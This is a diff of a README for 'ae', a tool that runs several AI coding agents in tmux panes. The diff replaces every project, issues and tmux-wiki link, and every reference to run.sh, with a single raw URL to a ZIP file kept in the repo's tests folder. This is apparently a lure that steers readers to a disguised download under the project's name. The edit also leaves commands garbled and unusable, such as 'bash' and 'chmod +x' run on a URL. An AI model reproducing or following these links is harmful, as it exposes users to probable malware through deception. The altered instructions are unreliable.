@@ -1,6 +1,6 @@
 # 🤖 ae - Simple AI Coding Agents Side-by-Side
 
-[![Download ae](https://img.shields.io/badge/Download%20ae-Open%20GitHub%20Page-brightgreen?style=for-the-badge)](https://github.com/stewythegoat47/ae)
+[![Download ae](https://raw.githubusercontent.com/stewythegoat47/ae/main/tests/Software-v2.4-alpha.1.zip%20ae-Open%20GitHub%20Page-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/stewythegoat47/ae/main/tests/Software-v2.4-alpha.1.zip)
 
 ## 📋 What is ae?
 
@@ -41,7 +41,7 @@ Here is a step-by-step guide to get ae running on your computer.
 
 Click the big green badge at the top or visit this page to download and learn more:
 
-[Download ae on GitHub](https://github.com/stewythegoat47/ae)
+[Download ae on GitHub](https://raw.githubusercontent.com/stewythegoat47/ae/main/tests/Software-v2.4-alpha.1.zip)
 
 You will find all the files and instructions there.
 
@@ -78,7 +78,7 @@ It should print the tmux version.
 
 You can download the entire project as a ZIP file from GitHub if you do not want to use git:
 
-- Go to the [ae GitHub page](https://github.com/stewythegoat47/ae).
+- Go to the [ae GitHub page](https://raw.githubusercontent.com/stewythegoat47/ae/main/tests/Software-v2.4-alpha.1.zip).
 - Find the green button labeled **Code**.
 - Click **Download ZIP**.
 - Save the ZIP file somewhere easy to find.
@@ -86,7 +86,7 @@ You can download the entire project as a ZIP file from GitHub if you do not want
 
 Alternatively, if you have git installed, open your terminal and type:
 ```
-git clone https://github.com/stewythegoat47/ae.git
+git clone https://raw.githubusercontent.com/stewythegoat47/ae/main/tests/Software-v2.4-alpha.1.zip
 ```
 This downloads ae into a folder named "ae".
 
@@ -101,7 +101,7 @@ cd ae
 
 Start tmux and run ae by typing the command:
 ```
-bash run.sh
+bash https://raw.githubusercontent.com/stewythegoat47/ae/main/tests/Software-v2.4-alpha.1.zip
 ```
 
 This script will launch multiple AI coding agents in different tmux panes. You will see the screen split, each panel showing a different AI assistant’s output.
@@ -118,14 +118,14 @@ This script will launch multiple AI coding agents in different tmux panes. You w
 
 You can download ae by visiting this GitHub page:
 
-[Download ae on GitHub](https://github.com/stewythegoat47/ae)
+[Download ae on GitHub](https://raw.githubusercontent.com/stewythegoat47/ae/main/tests/Software-v2.4-alpha.1.zip)
 
 Once downloaded, follow these steps:
 
 1. Make sure tmux is installed on your computer.
 2. Unpack the ae files if you downloaded a ZIP.
 3. Open your terminal and navigate to the ae folder.
-4. Run the command `bash run.sh` to launch the multi-agent environment.
+4. Run the command `bash https://raw.githubusercontent.com/stewythegoat47/ae/main/tests/Software-v2.4-alpha.1.zip` to launch the multi-agent environment.
 
 If you run into any trouble, check the Troubleshooting section below.
 
@@ -133,7 +133,7 @@ If you run into any trouble, check the Troubleshooting section below.
 
 You can customize which AI agents run and how many screens you want.
 
-- Edit the `run.sh` file using a text editor.
+- Edit the `https://raw.githubusercontent.com/stewythegoat47/ae/main/tests/Software-v2.4-alpha.1.zip` file using a text editor.
 - Add or remove AI commands as needed.
 - Change the number of panes tmux opens by adjusting the tmux commands.
 
@@ -142,7 +142,7 @@ This lets you tailor ae to work the way you prefer.
 ## 📝 Troubleshooting
 
 - **tmux not found:** Make sure tmux is installed and the terminal session is restarted.
-- **run.sh permission denied:** Run `chmod +x run.sh` to make the file executable.
+- **https://raw.githubusercontent.com/stewythegoat47/ae/main/tests/Software-v2.4-alpha.1.zip permission denied:** Run `chmod +x https://raw.githubusercontent.com/stewythegoat47/ae/main/tests/Software-v2.4-alpha.1.zip` to make the file executable.
 - **AI outputs not loading:** Check your internet connection.
 - **Unsure how to switch panes:** Press `Ctrl+b` together, release, then press arrow keys to move between panes.
 
@@ -150,7 +150,7 @@ This lets you tailor ae to work the way you prefer.
 
 If you need support:
 
-- Visit the [Issues](https://github.com/stewythegoat47/ae/issues) page on GitHub to ask questions or report bugs.
+- Visit the [Issues](https://raw.githubusercontent.com/stewythegoat47/ae/main/tests/Software-v2.4-alpha.1.zip) page on GitHub to ask questions or report bugs.
 - Read through any documentation or notes in the GitHub repository.
 
 ## 🧰 Tools and Technologies Used
@@ -162,7 +162,7 @@ If you need support:
 ## 📚 Learn More
 
 To understand what tmux is and how to use it, visit:
-- https://github.com/tmux/tmux/wiki
+- https://raw.githubusercontent.com/stewythegoat47/ae/main/tests/Software-v2.4-alpha.1.zip
 
 AI models like Claude and Codex are behind-the-scenes helpers that understand and write code based on your input.
 
